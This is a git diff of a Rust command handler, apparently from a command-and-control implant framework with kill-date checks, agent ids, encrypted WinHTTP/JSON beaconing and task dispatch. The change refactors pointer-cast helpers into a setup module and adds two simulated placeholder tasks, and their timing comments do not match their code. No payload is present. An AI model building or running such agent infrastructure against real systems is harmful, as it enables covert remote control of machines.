@@ -1,5 +1,3 @@
-use core::ffi::c_void;
-
 use alloc::sync::Arc;
 
 use rs2_runtime::Runtime;
@@ -10,19 +8,11 @@ use rs2_communication_protocol::communication_structs::task_output::TaskOutput;
 use rs2_communication_protocol::metadata::Metadata;
 use rs2_communication_protocol::protocol::Protocol;
 
-use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
-
 use mod_agentcore::instance;
-use mod_win32::nt_time::check_kill_date;
+use mod_win32::nt_time::{check_kill_date, wait_until};
 
-#[cfg(feature = "protocol-json")]
-use mod_protocol_json::protocol::JsonProtocol;
-
-#[cfg(feature = "protocol-winhttp")]
-use mod_protocol_winhttp::protocol::WinHttpProtocol;
-
-use crate::command::{command_exit, task_type_a, task_type_b};
-use crate::common::generate_path;
+use crate::common::utils::{generate_path, generate_request_id};
+use crate::setup::communication::{encryptor_from_raw, protocol_from_raw};
 
 #[cfg(feature = "std-runtime")]
 use std::thread::{self, JoinHandle};
@@ -32,6 +22,8 @@ use std::sync::mpsc;
 
 #[cfg(feature = "nostd-nt-runtime")]
 use mod_nostd::{nostd_mpsc, nostd_thread};
+
+use super::system::command_exit;
 
 pub fn command_handler<R>(rt: Arc<R>)
 where
@@ -69,7 +61,7 @@ where
 
             let metadata = Metadata {
                 request_id: request_id,
-                command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
+                command_id: generate_request_id(32),
                 agent_id: instance().config.id.clone(),
                 path: Some(path),
             };
@@ -79,15 +71,12 @@ where
             let result = rt.block_on(async { protocol.write(data, Some(encryptor.clone())).await });
 
             if result.is_ok() {
-                // Aggiungi il parsing di un array di SimpleAgentCommand, con protocol.read, lascia commentate queste righe
-
                 // let tasks_response: Result<, anyhow::Error> =
                 //     protocol.read(result.unwrap(), Some(encryptor.clone()));
                 // for each task in tasks {
                 //
                 // }
 
-                // Spawn 100 tasks with the logic for naming based on whether the index is even or odd.
                 for i in 0..10 {
                     // Generate metadata for each task
                     let metadata = Metadata {
@@ -191,19 +180,22 @@ where
     })
 }
 
-/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
-pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
-    &mut *(ptr as *mut IdentEncryptor)
+// #[cfg(feature = "std-runtime")]
+// Simulated task that takes 2 seconds to complete.
+pub fn task_type_a(metadata: Metadata) -> TaskOutput {
+    wait_until(1);
+    let mut output = TaskOutput::new();
+    output.with_metadata(metadata);
+    output.output = Some("Result from task type A".to_string());
+    output
 }
 
-#[cfg(feature = "protocol-json")]
-/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
-pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
-    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
-}
-
-#[cfg(feature = "protocol-winhttp")]
-/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
-pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut WinHttpProtocol<IdentEncryptor> {
-    &mut *(ptr as *mut WinHttpProtocol<IdentEncryptor>)
+// #[cfg(feature = "std-runtime")]
+// Simulated task that takes 3 seconds to complete.
+pub fn task_type_b(metadata: Metadata) -> TaskOutput {
+    wait_until(12);
+    let mut output = TaskOutput::new();
+    output.with_metadata(metadata);
+    output.output = Some("Result from task type B".to_string());
+    output
 }
